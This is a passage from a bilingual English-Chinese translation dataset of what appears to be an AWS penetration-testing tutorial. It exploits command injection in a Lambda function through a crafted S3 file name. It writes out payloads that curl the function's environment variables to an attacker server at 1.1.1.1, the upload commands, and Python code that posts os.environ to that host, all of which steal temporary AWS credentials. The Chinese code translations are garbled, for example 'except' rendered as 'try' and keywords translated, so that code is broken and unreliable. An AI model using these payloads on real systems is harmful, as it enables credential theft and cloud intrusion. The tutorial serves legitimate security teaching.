  zh: 将函数解压到我们的计算机上后，我们现在将开始对包含的代码进行静态分析。我们知道这个函数正在运行Python 3.7，因为当我们运行`ListFunctions`和`GetFunction`时，`Runtime`下列出了Python
    3.7，并且主文件是一个`.py`文件。代码的静态分析有许多选项，免费和付费的，它们在不同的编程语言之间有所不同，但我们将使用`Bandit`，它被描述为一个旨在发现Python代码中常见安全问题的工具。在继续之前，请注意，仅仅因为我们在这里使用它，并不一定意味着它是最好的和/或完美的。我建议您进行自己的研究，并尝试不同的工具，找到自己喜欢的工具，但Bandit是我个人喜欢使用的工具之一。Bandit托管在GitHub上[https://github.com/PyCQA/bandit](https://github.com/PyCQA/bandit)。
- en: 'The installation of Bandit is simple, because it is offered through PyPI, which
    means we can use the Python package manager, `pip`, to install it. Following the
    instructions on the Bandit GitHub, we will run the following commands (be sure
    to check for yourself, in case anything has been updated since this was written):'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: Bandit的安装很简单，因为它是通过PyPI提供的，这意味着我们可以使用Python包管理器`pip`来安装它。按照Bandit GitHub上的说明，我们将运行以下命令（一定要自行检查，以防有任何更新）：
- en: '[PRE5]'
  id: totrans-74
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'We use `virtualenv`, so as to not cause any issues with our Python dependencies
    being installed, and then we use `pip3` to install `bandit`, because the code
    we want to analyze is written in Python 3\. At the time of writing, Bandit version
    1.5.1 was installed, so be aware of your own installed version if you run into
    any issues throughout the rest of this section. Once installed, we can change
    directories to the directory where we unzipped the Lambda function, then use the
    `bandit` command to target the folder with our code. We can use the following
    command to do that:'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 我们使用`virtualenv`，以避免安装Python依赖项时出现任何问题，然后我们使用`pip3`来安装`bandit`，因为我们要分析的代码是用Python
    3编写的。在撰写本文时，安装了Bandit版本1.5.1，因此如果在本节的其余部分遇到任何问题，请注意您自己安装的版本。安装完成后，我们可以切换到解压Lambda函数的目录，然后使用`bandit`命令来针对包含我们代码的文件夹。我们可以使用以下命令来执行：
- en: '[PRE6]'
  id: totrans-76
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'Now the Lambda function will be scanned, where the `-r` flag specifies recursive,
    as in scan every file in the `VulnerableFunction` folder. We only have one file
    in there right now, but it''s good to know what that flag does for the bigger
    Lambda functions we are scanning. After Bandit finishes, we will see that it reported
    on three separate issues: one with low severity and high confidence, one with
    medium severity and medium confidence, and one with high severity and high confidence:'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 现在Lambda函数将被扫描，`-r`标志指定递归，即扫描`VulnerableFunction`文件夹中的每个文件。我们现在只有一个文件，但了解这个标志对我们正在扫描的更大的Lambda函数有什么作用是很有用的。Bandit完成后，我们将看到它报告了三个单独的问题：一个低严重性和高置信度，一个中等严重性和中等置信度，一个高严重性和高置信度：
- en: '![](img/6ad0c8d1-f53a-4200-a6a4-b49304c6b2e2.png)'
  id: totrans-78
  prefs: []
  type: TYPE_IMG
  zh: '![](img/6ad0c8d1-f53a-4200-a6a4-b49304c6b2e2.png)'
- en: The results that were output by Bandit
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: Bandit输出的结果
- en: Typically, static source code analysis tools will output a reasonable number
    of false positives, so it is important to go through each issue to verify whether
    it is a real issue. Static analysis tools also lack context on how the code may
    be used, so a security issue may be a problem for some code, but not a big deal
    for others. We will look at context more when reviewing the second issue presented
    by Bandit.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，静态源代码分析工具会输出相当数量的误报，因此重要的是要逐个检查每个问题，以验证它是否是一个真正的问题。静态分析工具也缺乏代码可能如何使用的上下文，因此安全问题可能对某些代码是一个问题，但对其他代码来说并不重要。在审查Bandit提出的第二个问题时，我们将更多地关注上下文。
- en: Looking at the first issue that Bandit reported, we can see the message `Consider
    possible security implications associated with the subprocess module`, which makes
    a lot of sense. The subprocess module is used to spawn new processes on the machine,
    which could pose a security risk if not done correctly. We will go ahead and mark
    this as a valid issue, but it's more something to keep in mind when reviewing
    the code.
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 查看Bandit报告的第一个问题，我们可以看到消息“考虑与子进程模块相关的可能安全影响”，这是非常有道理的。子进程模块用于在计算机上生成新进程，如果操作不正确可能会造成安全风险。我们将把这标记为一个有效问题，但在审查代码时要牢记这一点。
- en: The second issue that Bandit reported tells us `Probable insecure usage of temp
    file/directory`, and it shows us the lines of code where a variable is assigned
    the value of a file path in the `/tmp` directory, appended with another variable, `object_key`.
    This is a security issue that may be a big issue in some applications, but given
    the context of our Lambda function, we can assume that it is not a problem in
    this situation. Why? Part of the security risk comes with the possibility of a
    user being able to control the file path. A user could potentially insert a path
    traversal sequence or do something like trick the script into writing that temporary
    file to somewhere else, such as `/etc/shadow`, which could have dangerous consequences.
    This isn't an issue for us, because the code is being run in Lambda, which means
    it is running on a read-only filesystem; so, even if someone was able to traverse
    out of the `/tmp` directory, the function would fail to overwrite any important
    files on the system. There are other possible issues that could arise here, but
    nothing directly applicable to us, so we can go ahead and cross this issue off
    as a false positive.
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: Bandit报告的第二个问题告诉我们“可能不安全地使用了临时文件/目录”，并向我们显示了代码的行，其中一个变量被赋予了`/tmp`目录中文件路径的值，附加了另一个变量`object_key`。这是一个安全问题，在某些应用程序中可能是一个大问题，但考虑到我们Lambda函数的上下文，我们可以假设在这种情况下这不是一个问题。为什么？安全风险的一部分是可能有用户能够控制文件路径。用户可能会插入路径遍历序列或者欺骗脚本将临时文件写入其他位置，比如`/etc/shadow`，这可能会带来危险的后果。这对我们来说不是一个问题，因为代码在Lambda中运行，这意味着它在只读文件系统上运行；所以，即使有人能够遍历出`/tmp`目录，函数也无法覆盖系统上的任何重要文件。这里可能会出现其他可能的问题，但对我们来说没有直接适用的，所以我们可以把这个问题划掉为误报。
- en: Moving on to the final and most severe issue raised by Bandit, we are shown
    `subprocess call with shell=True identified, security issue`, which sounds juicy.
    This is telling us that a new process is being spawned with access to the operating
    systems shell, which might mean that we can inject shell commands! Looking at
    the line that Bandit flagged (line 30), we can even see a Python variable (`file_download_path`)
    directly concatenated into the command that is being run. That means that if we
    can somehow take control of that value, we can modify the command being run on
    the operating system to execute arbitrary code.
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来是Bandit提出的最后一个最严重的问题，它告诉我们“识别出了使用shell=True的子进程调用，存在安全问题”，听起来很有趣。这告诉我们正在生成一个新进程，并且可以访问操作系统的shell，这可能意味着我们可以注入shell命令！看看Bandit标记的行（第30行），我们甚至可以看到一个Python变量（`file_download_path`）直接连接到正在运行的命令中。这意味着如果我们可以以某种方式控制该值，我们可以修改在操作系统上运行的命令以执行任意代码。
- en: 'Next, we want to see where `file_download_path` is assigned a value. We know
    that its assignment showed up in issue #2 from Bandit (on line 25), which looks
    like this:'
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们想看看`file_download_path`在哪里被赋值。我们知道它的赋值出现在Bandit的问题＃2（第25行），代码如下：
- en: '[PRE7]'
  id: totrans-85
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: Just like the string from line 30, Python 3 `f` strings are being used (see
    [https://docs.python.org/3/whatsnew/3.6.html#pep-498-formatted-string-literals](https://docs.python.org/3/whatsnew/3.6.html#pep-498-formatted-string-literals)
    for more information), which basically allow you to embed variables and code within
    strings, so you don't have to do any messy concatenation, with plus signs or anything
    like that. What we can see here is that `file_download_path` is a string that
    includes another variable in the code, `object_key`, which gets split at each `"/"`
    in it. Then, the `[-1]` is saying to use the last element of the list that was
    created from splitting at `"/"`.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 就像第30行的字符串一样，这里使用了Python 3的`f`字符串（有关更多信息，请参见[https://docs.python.org/3/whatsnew/3.6.html#pep-498-formatted-string-literals](https://docs.python.org/3/whatsnew/3.6.html#pep-498-formatted-string-literals)），它基本上允许您在字符串中嵌入变量和代码，因此您不必进行任何混乱的连接，使用加号或其他任何东西。我们在这里看到的是`file_download_path`是一个字符串，其中包含代码中的另一个变量`object_key`，它在其中的每个`"/"`处被拆分。然后，`[-1]`表示使用从`"/"`拆分而成的列表的最后一个元素。
- en: 'Now, if we trace back the `object_key` variable to see where it gets assigned,
    we can see on line 13 that it is assigned the value of `record[''s3''][''object''][''key'']`.
    Okay, so we can see that the function is expecting the `event` variable to contain
    information about an S3 object (as well as an S3 bucket, on line 11). We want
    to figure out if we can somehow control the value of that variable, but given
    the context we have as an attacker, we have no idea when (or if) this function
    even gets invoked regularly, and we don''t know how, either. The first thing we
    can check for is if there are any event source mappings associated with our Lambda
    function. This can be accomplished with the following command:'
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，如果我们追溯`object_key`变量，看看它是在哪里被赋值的，我们可以看到在第13行，它被赋值为`record['s3']['object']['key']`的值。好的，我们可以看到函数期望`event`变量包含有关S3对象的信息（以及第11行的S3存储桶）。我们想弄清楚是否可以以某种方式控制该变量的值，但考虑到我们作为攻击者的上下文，我们不知道这个函数是否会定期被调用，也不知道如何调用。我们可以检查的第一件事是我们的Lambda函数是否有任何事件源映射。可以使用以下命令来完成这个任务：
- en: '[PRE8]'
  id: totrans-88
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: 'In this scenario, we should get nothing back but an empty list, like this:'
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，我们应该得到一个空列表，如下所示：
- en: '[PRE9]'
  id: totrans-90
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: Event source mappings are basically a way of hooking up a Lambda function to
    another service, so that it can be triggered when something else in that service
    happens. An example event source mapping would be with DynamoDB, where every time
    an item gets modified in a DynamoDB table, it triggers a Lambda function with
    the contents that were added to the table. As you can see, there is nothing like
    this associated with our current function, but it is no time to panic! Not every
    source of automated triggering will show up as an event source mapping.
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 事件源映射基本上是将Lambda函数连接到另一个服务的一种方式，以便在该服务中发生其他事情时触发它。事件源映射的一个示例是DynamoDB，每当DynamoDB表中的项目被修改时，它就会触发一个Lambda函数，并包含被添加到表中的内容。正如您所看到的，我们当前的函数没有与此相关的内容，但现在不是恐慌的时候！并非每个自动触发源都会显示为事件源映射。
- en: 'The next step will be to look at the Lambda functions resource policy, which
    basically specifies what can invoke this function. To fetch the resource policy,
    we will use the `GetPolicy` API:'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 下一步将是查看Lambda函数的资源策略，它基本上指定了谁可以调用此函数。要获取资源策略，我们将使用`GetPolicy` API：
- en: '[PRE10]'
  id: totrans-93
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: If we're lucky, we will get a JSON object in response to this API call, but
    if not, we may receive an API error that the resource could not be found. This
    would indicate that there is no resource policy set up for the Lambda function.
    If that is the case, then we likely won't be able to invoke this Lambda function
    in any way, unless we happen to have the `lambda:InvokeFunction` permission (but
    we don't in this case).
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们幸运的话，我们将得到一个JSON对象作为对此API调用的响应，但如果没有，我们可能会收到API错误，指示找不到资源。这将表明没有为Lambda函数设置资源策略。如果是这种情况，那么我们可能无法以任何方式调用此Lambda函数，除非我们碰巧拥有`lambda:InvokeFunction`权限（但在这种情况下我们没有）。
- en: 'Today must be our lucky day, because a policy is returned to us. It should
    look something like the following, except that `000000000000` will be replaced
    by your own AWS account ID, and the revision ID will be different, as well:'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 今天一定是我们的幸运日，因为我们得到了一个策略。它应该看起来像下面这样，只是`000000000000`将被您自己的AWS帐户ID替换，修订ID将不同：
- en: '[PRE11]'
  id: totrans-96
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: 'Messy and hard to read, right? Well, that is because a JSON object is being
    stored as a string, as the value of a key in another JSON object. To make this
    a little clearer, we can copy the whole value from within the `"Policy"` key,
    remove the escape characters (`\`), and add some nice indentation, and we will
    then end up with this:'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 混乱且难以阅读，对吧？这是因为一个JSON对象被存储为一个字符串，作为另一个JSON对象中一个键的值。为了使这一点更清晰，我们可以复制`"Policy"`键内的整个值，删除转义字符（`\`），并添加一些漂亮的缩进，然后我们将得到这样的结果：
- en: '[PRE12]'
  id: totrans-98
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: That looks a bit better, doesn't it? What we are looking at is a JSON policy
    document that specifies what can invoke this Lambda function, and we can tell
    that because the `"Action"` is set to `"lambda:InvokeFunction"`. Next, we can
    look at the `"Principal"`, which is set to the AWS service S3\. That sounds right,
    because we know the function is handling S3 objects. Under `"Resource"`, we see
    the ARN for the Lambda function, as expected. Under `"Condition"`, we see that
    the `"AWS:SourceAccount"` must be `000000000000`, which is the account ID that
    we are working in, so that's good. There's also `"ArnLike"` under `"Condition"`,
    which shows an ARN of an S3 bucket. We don't have the S3 permissions required
    to go and confirm this information, but we can make a reasonable assumption that
    some sort of S3 event has been set up to invoke this function when something happens
    (and we know this is true because we set it up earlier).
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 看起来好多了，不是吗？我们正在查看一个JSON策略文档，指定了什么可以调用这个Lambda函数，我们可以看到`"Action"`设置为`"lambda:InvokeFunction"`。接下来，我们可以看到`"Principal"`设置为AWS服务S3。这听起来正确，因为我们知道该函数正在处理S3对象。在`"Resource"`下，我们看到了Lambda函数的ARN，正如预期的那样。在`"Condition"`下，我们看到`"AWS:SourceAccount"`必须是`000000000000`，这是我们正在使用的账户ID，所以很好。在`"Condition"`下还有`"ArnLike"`，显示了一个S3存储桶的ARN。我们没有所需的S3权限去确认这些信息，但我们可以合理地假设某种S3事件已经设置好，当发生某些事情时会调用这个函数（我们知道这是真的，因为我们之前设置过）。
- en: Another big hint can be found in the `"Sid"` key, where we see the value `"000000000000_event_permissions_for_LambdaTriggerOnS3Upload_from_bucket-for-lambda-pentesting_for_Vul"`,
    which shows us `"LambdaTriggerOnS3Upload"`. We can now make an educated guess
    that this Lambda function is invoked when files are uploaded to the S3 bucket, `"bucket-for-lambda-pentesting"`.
    If you remember when we set these resources up, `"LambdaTriggerOnS3Upload"` is
    what we named the event trigger that we added to our S3 bucket earlier, so in
    this case, a verbose naming scheme helped us out as an attacker. What's even better
    is that we know we have the `"s3:PutObject"` permission applied to our compromised
    user!
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个重要的提示可以在`"Sid"`键中找到，我们可以看到值为`"000000000000_event_permissions_for_LambdaTriggerOnS3Upload_from_bucket-for-lambda-pentesting_for_Vul"`，这显示了`"LambdaTriggerOnS3Upload"`。现在我们可以做出一个合理的猜测，即当文件上传到S3存储桶`"bucket-for-lambda-pentesting"`时，将调用这个Lambda函数。如果你还记得我们设置这些资源时，`"LambdaTriggerOnS3Upload"`就是我们之前添加到S3存储桶的事件触发器的名称，所以在这种情况下，冗长的命名方案帮助了我们作为攻击者。更好的是，我们知道我们的受损用户被授予了`"s3:PutObject"`权限！
- en: We have all the pieces to the puzzle now. We know that the Lambda function runs
    a shell command with a variable (`file_download_path`), and we know that variable
    is comprised of another variable `(object_key`), which we know gets set to the
    value `record['s3']['object']['key']`. We also know that this Lambda function
    gets invoked whenever a file is uploaded to the `"bucket-for-lambda-pentesting"`
    S3 bucket, and that we have the necessary permissions to upload files to that
    bucket. Given all of that, that means we can upload a file with a name that we
    choose, that will eventually get passed down into a shell command, which is exactly
    what we want if we are trying to execute code on the system!
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经拼出了这个谜题的所有部分。我们知道Lambda函数运行一个带有变量（`file_download_path`）的shell命令，我们知道该变量由另一个变量（`object_key`）组成，我们知道该变量被设置为值`record['s3']['object']['key']`。我们还知道，每当文件上传到`"bucket-for-lambda-pentesting"`
    S3存储桶时，就会调用这个Lambda函数，而且我们有必要的权限将文件上传到该存储桶。鉴于这一切，这意味着我们可以上传一个我们选择的文件，最终将其传递到一个shell命令中，这正是我们想要的，如果我们试图在系统上执行代码！
- en: But hold on; what benefit is there to executing arbitrary code on a server running
    a Lambda function when it is a read-only filesystem and we already have the source
    code? More credentials, that's the benefit! If you recall from earlier, we needed
    to create an IAM role to attach to the Lambda function we created, which then
    allowed our function to authenticate with the AWS APIs. When a Lambda function
    runs, it assumes the IAM role attached to it and gets a set of temporary credentials
    (remember, that is an access key ID, secret access key, and session token). Lambda
    functions are a bit different than EC2 instances, which means there is no metadata
    service at `http://169.254.169.254`, which again means we can't retrieve those
    temporary credentials through there. Lambda does it differently; it stores the
    credentials in environment variables, so once we can execute code on the server,
    we can exfiltrate those credentials, where we would then have access to all the
    permissions associated with the role attached to the Lambda function.
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 但是，等等；在运行Lambda函数的服务器上执行任意代码有什么好处呢？它是一个只读文件系统，而且我们已经有了源代码。更多的凭证，这就是好处！如果你还记得之前，我们需要创建一个IAM角色，附加到我们创建的Lambda函数上，然后允许我们的函数与AWS
    API进行身份验证。当Lambda函数运行时，它会假定附加到它的IAM角色，并获得一组临时凭证（记住，这是访问密钥ID、秘密访问密钥和会话令牌）。Lambda函数与EC2实例有些不同，这意味着没有`http://169.254.169.254`上的元数据服务，这意味着我们无法通过那里检索这些临时凭证。Lambda的做法不同；它将凭证存储在环境变量中，所以一旦我们能在服务器上执行代码，我们就可以窃取这些凭证，然后我们将获得附加到Lambda函数的角色的所有权限。
- en: In this case, we know that the LambdaRoleForVulnerableFunction IAM role has
    ­full S3 access, which is quite a lot more than our measly `PutObject` access,
    and it also has a few CloudWatch log permissions. We don't currently have access
    to reading logs in CloudWatch, so we will need to exfiltrate the credentials to
    a server we control. Otherwise, we won't be able to read the values.
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，我们知道LambdaRoleForVulnerableFunction IAM角色具有完全的S3访问权限，这比我们微不足道的`PutObject`访问权限要多得多，它还具有一些CloudWatch日志权限。我们目前无法访问CloudWatch中的日志，所以我们需要将凭证窃取到我们控制的服务器上。否则，我们将无法读取这些值。
- en: 'Now, let''s get started with our payload. Sometimes, it might help you to formulate
    a payload if you copy the entire Lambda function over to your own AWS account,
    where you can just blast it with payloads until you find something that works,
    but we are going to try this out manually first. We know that we essentially control
    the `object_key` variable, which eventually gets placed into a shell command.
    So, if we passed in a harmless value of `"hello.zip"`, we will see the following:'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们开始我们的有效载荷。有时，如果您将整个Lambda函数复制到自己的AWS帐户中，可能会有所帮助，这样您就可以使用有效载荷对其进行轰炸，直到找到有效的有效载荷，但我们将首先手动尝试。我们知道我们基本上控制`object_key`变量，最终将其放入shell命令中。因此，如果我们传入一个无害的值`"hello.zip"`，我们将看到以下内容：
- en: '[PRE13]'
  id: totrans-105
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: There only seems to be one restriction that we need to worry about, and that
    is that the code checks whether the file has a `.zip` extension on line 16\. Given
    all this information, we can now start to work on our malicious payload.
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 似乎只有一个限制需要我们担心，那就是代码检查文件是否在第16行具有`.zip`扩展名。有了所有这些信息，我们现在可以开始制作恶意有效载荷。
- en: The `zipinfo /tmp/hello.zip` command has our user-supplied string directly in
    it, so we just need to break this command up to run our own arbitrary commands.
    If we changed `hello.zip` to something like `hello;sleep 5;.zip`, then the final
    command would end up being `"zipinfo /tmp/hello;sleep 5;.zip | grep ^- | wc -l"`.
    We inserted a couple of semicolons, which cause the shell interpreter (bash) to
    think that there is more than one command to be executed. Instead of a single
    command, `zipinfo /tmp/hello.zip`, being run, it will instead run `"zipinfo /tmp/hello"`,
    which will fail because that isn't a file that exists; then, it will run `"sleep
    5"` and sleep for five seconds, and then it will run `".zip"`, which isn't a real
    command, so an error will be thrown.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: '`zipinfo /tmp/hello.zip`命令中直接包含了我们提供的字符串，因此我们只需要打破这个命令以运行我们自己的任意命令。如果我们将`hello.zip`更改为`hello;sleep
    5;.zip`，那么最终命令将变成`"zipinfo /tmp/hello;sleep 5;.zip | grep ^- | wc -l"`。我们插入了几个分号，这会导致shell解释器（bash）认为有多个要执行的命令。不是运行单个命令`zipinfo
    /tmp/hello.zip`，而是运行`"zipinfo /tmp/hello"`，这将失败，因为那不是一个存在的文件；然后，它将运行`"sleep 5"`并休眠五秒，然后它将运行`".zip"`，这不是一个真正的命令，因此将抛出错误。'
- en: Just like that, we have injected a command (`sleep 5`) into the Lambda server's
    shell. Now, because this is blind (as in, we can't see the output of any of our
    commands), we need to exfiltrate the important information that we want. The operating
    system supporting Lambda functions has `"curl"` installed by default, so that
    will be an easy way to make an external request, and we know that the AWS credentials
    are stored in environment variables, so we just need to `curl` the credentials
    to a server we control.
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 就像这样，我们已经将一个命令(`sleep 5`)注入到Lambda服务器的shell中。现在，因为这是盲目的（也就是说，我们看不到任何命令的输出），我们需要窃取我们想要的重要信息。支持Lambda函数的操作系统默认安装了`"curl"`，因此这将是进行外部请求的一种简单方法，我们知道AWS凭证存储在环境变量中，因此我们只需要`curl`凭证到我们控制的服务器。
- en: 'To do this, I have set up a NetCat listener on my own server (with the IP address
    `1.1.1.1` as an example for this demo) that has port `80` open, with the following
    command:'
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 为此，我在自己的服务器上设置了NetCat监听器（示例中的IP地址为`1.1.1.1`），端口为`80`，命令如下：
- en: '[PRE14]'
  id: totrans-110
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: 'Then, we''ll formulate our payload that will exfiltrate the credentials. We
    can access the environment variables with the `"env"` command, so the general
    command to make an HTTP POST request to our external server with curl that includes
    all of the environment variables as the body will be as follows:'
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，我们将制定一个有效载荷，将窃取凭证。我们可以使用`"env"`命令访问环境变量，因此用curl向我们的外部服务器发出HTTP POST请求的一般命令，其中包括所有环境变量作为主体，如下所示：
- en: '[PRE15]'
  id: totrans-112
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: It might look a little funky, but because the `"env"` command provides multiline
    content, it needs to be put into quotes, or else it will mess up the entire command
    (try running `"curl -X POST -d `env` 1.1.1.1"` against your own server and look
    at the results). If you are not familiar, the backticks ([PRE16]
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 这可能看起来有点奇怪，但因为`"env"`命令提供多行内容，所以需要将其放入引号中，否则它将破坏整个命令（尝试在自己的服务器上运行`"curl -X POST
    -d `env` 1.1.1.1"`并查看结果）。如果您不熟悉，反引号（[PRE16]
- en: hello;curl -X POST -d "`env`" 1.1.1.1;.zip
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: hello;curl -X POST -d "`env`" 1.1.1.1;.zip
- en: '[PRE17]'
  id: totrans-115
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: touch 'hello;curl -X POST -d "`env`" 1.1.1.1;.zip'
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: touch 'hello;curl -X POST -d "`env`" 1.1.1.1;.zip'
- en: '[PRE18]'
  id: totrans-117
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: aws s3 cp ./'hello;curl -X POST -d "`env`" 1.1.1.1;.zip' s3://bucket-for-lambda-pentesting
    --profile LambdaReadOnlyTester
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: aws s3 cp ./'hello;curl -X POST -d "`env`" 1.1.1.1;.zip' s3://bucket-for-lambda-pentesting
    --profile LambdaReadOnlyTester
- en: '[PRE19]'
  id: totrans-119
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: aws iam list-roles --profile LambdaReadWriteUser
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: aws iam list-roles --profile LambdaReadWriteUser
- en: '[PRE20]'
  id: totrans-121
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: '{'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: '{'
- en: '"Path": "/",'
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: '"路径": "/",'
- en: '"RoleName": "LambdaRoleForVulnerableFunction",'
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: '"角色名称": "LambdaRoleForVulnerableFunction",'
- en: '"RoleId": "AROAIWA1V2TCA1TNPM9BL",'
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: '"角色ID": "AROAIWA1V2TCA1TNPM9BL",'
- en: '"Arn": "arn:aws:iam::000000000000:role/LambdaRoleForVulnerableFunction",'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: '"Arn": "arn:aws:iam::000000000000:role/LambdaRoleForVulnerableFunction",'
- en: '"CreateDate": "2018-12-19T21:01:17Z",'
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: '"创建日期": "2018-12-19T21:01:17Z",'
- en: '"AssumeRolePolicyDocument": {'
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: '"假定角色策略文档": {'
- en: '"Version": "2012-10-17",'
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: '"版本": "2012-10-17",'
- en: '"Statement": ['
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: '"声明": ['
- en: '{'
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: '{'
- en: '"Effect": "Allow",'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: '"效果": "允许",'
- en: '"Principal": {'
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: '"主体": {'
- en: '"Service": "lambda.amazonaws.com"'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: '"服务": "lambda.amazonaws.com"'
- en: '},'
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: '}，'
- en: '"Action": "sts:AssumeRole'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: '"操作": "sts:AssumeRole'
- en: '}'
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: '}'
- en: ']'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: ']'
- en: '},'
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: '}，'
- en: '"Description": "Allows Lambda functions to call AWS services on your behalf.",'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: '"描述": "允许Lambda函数代表您调用AWS服务。",'
- en: '"MaxSessionDuration": 3600'
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: '"最大会话持续时间": 3600'
- en: '}'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: '}'
- en: '[PRE21]'
  id: totrans-143
  prefs: []
  type: TYPE_PRE
  zh: '[PRE21]'
- en: import json
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 导入json
- en: import boto3
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 导入boto3
- en: 'def lambda_handler(event, context):'
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: def lambda_handler（event，context）：
- en: ec2 = boto3.client('ec2')
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: ec2 = boto3.client（'ec2'）
- en: reservations = ec2.describe_instances()['Reservations']
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: reservations = ec2.describe_instances（）['Reservations']
- en: print(json.dumps(reservations, indent=2, default=str))
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 打印（json.dumps（reservations，indent = 2，默认= str））
- en: '[PRE22]'
  id: totrans-150
  prefs: []
  type: TYPE_PRE
  zh: '[PRE22]'
- en: 'try:'
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: 尝试：
- en: s3 = boto3.client('s3')
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: s3 = boto3.client（'s3'）
- en: print(s3.list_buckets())
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 打印（s3.list_buckets（））
- en: 'except:'
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 尝试：
- en: pass
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 通过
- en: '[PRE23]'
  id: totrans-156
  prefs: []
  type: TYPE_PRE
  zh: '[PRE23]'
- en: from botocore.vendored import requests
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 从botocore.vendored导入请求
- en: '[PRE24]'
  id: totrans-158
  prefs: []
  type: TYPE_PRE
  zh: '[PRE24]'
- en: 'try:'
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 尝试：
- en: import os
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 导入os
- en: from botocore.vendored import requests
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 从botocore.vendored导入请求
- en: requests.post('http://1.1.1.1', json=os.environ.copy(), timeout=0.01)
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 请求.post（'http://1.1.1.1'，json = os.environ.copy（），超时= 0.01）
- en: 'except:'
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 尝试：
- en: pass
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 通过
